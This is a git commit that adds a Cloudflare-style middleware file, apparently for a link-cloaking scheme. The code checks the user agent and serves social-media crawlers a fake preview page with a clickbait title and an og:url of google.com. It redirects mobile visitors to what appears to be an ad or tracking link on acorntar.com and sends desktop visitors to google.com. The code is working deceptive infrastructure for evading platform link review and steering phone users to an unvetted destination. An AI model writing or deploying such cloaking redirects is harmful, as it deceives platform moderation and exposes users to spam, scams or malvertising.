8ddcdbbabce941b2199f103760c2909353577627
samjakinngg-del <samjakinngg@gmail.com>
2026-09-07 10:09:55 +0500

    Create _middleware.js

---
+++ functions/_middleware.js
@@ -0,0 +1,38 @@
+export async function onRequest(context) {
+  const request = context.request;
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // 1. Check for Social Media Crawlers / Bots
+  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);
+
+  if (isSocialBot) {
+    const htmlContent = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Mon-Sep-07-2026/f7ca0cc4-5c23-4014-85a8-62a2790ddcb1/c51e827c-6e4b-449d-af71-c1e61f4b55f5.tiff">
+    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:type" content="website">
+</head>
+<body>
+</body>
+</html>`;
+
+    return new Response(htmlContent, {
+      headers: { 'content-type': 'text/html;charset=UTF-8' },
+    });
+  }
+
+  // 2. Check for Mobile Users
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+  if (isMobile) {
+    return Response.redirect("https://acorntar.com/exu7e711?key=3156652af9a6a1322c8719d0a88532a7", 302);
+  } else {
+    return Response.redirect("https://www.google.com", 302);
+  }
+}
